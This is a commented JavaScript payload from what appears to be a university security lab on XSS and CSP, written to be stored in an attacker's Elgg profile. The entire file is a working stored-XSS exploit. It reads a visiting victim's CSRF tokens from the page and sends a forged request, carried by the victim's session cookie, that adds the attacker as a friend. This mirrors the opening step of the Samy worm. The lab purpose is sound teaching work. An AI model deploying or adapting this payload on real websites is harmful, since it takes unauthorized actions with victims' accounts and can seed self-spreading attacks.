/*
 * Lab 3 — XSS and CSP
 * Task 2: Stored XSS — CSRF via XSS to add Samy as a friend
 * Description:
 *   This payload is stored in Samy's (the attacker's) Elgg profile.
 *   When any logged-in victim visits Samy's profile the script:
 *     1. Reads the Elgg CSRF tokens from the current page DOM.
 *     2. Constructs the "add friend" API URL with Samy's GUID.
 *     3. Fires a GET request authenticated by the victim's session cookie,
 *        causing the server to add Samy as a friend on the victim's behalf.
 *
 * Why GET (not POST)?
 *   Elgg's /action/friends/add endpoint accepts a GET request, so we only
 *   need to craft a URL with the right query parameters.
 *
 * Samy's GUID is hardcoded; the attacker discovers this by inspecting the
 * page source on their own profile or via the Elgg admin panel.
 */

// ============================================================
// PAYLOAD — embed inside a <script id="worm"> tag in the profile
// ============================================================

(function () {
    "use strict";

    // ------------------------------------------------------------------
    // Step 1: Read CSRF tokens from the current page
    // ------------------------------------------------------------------
    // Elgg injects two CSRF tokens into every authenticated page via
    // JavaScript variables: elgg.security.token.__elgg_ts (a timestamp)
    // and elgg.security.token.__elgg_token (a random hex token).
    // Both must be included in every state-changing request to pass the
    // server-side CSRF check.

    var ts    = elgg.security.token.__elgg_ts;      // Unix timestamp string
    var token = elgg.security.token.__elgg_token;   // Random CSRF token

    // ------------------------------------------------------------------
    // Step 2: Samy's (attacker's) Elgg GUID
    // ------------------------------------------------------------------
    // The GUID is the numeric primary key of Samy's user record in the DB.
    // Discovered by: viewing page source on Samy's profile and searching
    // for "guid" or by checking the URL of Samy's profile page.

    var samyGUID = 59;   // Samy's hardcoded GUID in the lab environment

    // ------------------------------------------------------------------
    // Step 3: Build the add-friend API URL
    // ------------------------------------------------------------------
    // The Elgg add-friend action expects:
    //   friend=<GUID of the user to add>
    //   __elgg_ts=<timestamp>
    //   __elgg_token=<token>

    var sendURL = "http://www.seed-server.com/action/friends/add"
                + "?friend=" + samyGUID
                + "&__elgg_ts=" + ts
                + "&__elgg_token=" + token;

    // ------------------------------------------------------------------
    // Step 4: Send the forged request using XMLHttpRequest
    // ------------------------------------------------------------------
    // Because the request originates from within the victim's browser
    // session (same origin), the victim's session cookie is automatically
    // attached by the browser.  The server sees a legitimate authenticated
    // add-friend request and complies.

    var ajax = new XMLHttpRequest();

    // Open an asynchronous GET request — we do not need the response body
    ajax.open("GET", sendURL, true);

    // withCredentials ensures the session cookie is sent (same-origin so
    // this is implicit, but included for clarity)
    ajax.withCredentials = true;

    // Send the request; no body needed for GET
    ajax.send();

    // Optional: log to console for debugging (visible in browser DevTools)
    // console.log("[XSS Task2] Add-friend request sent to: " + sendURL);

})();  // Immediately-invoked function expression (IIFE) isolates scope
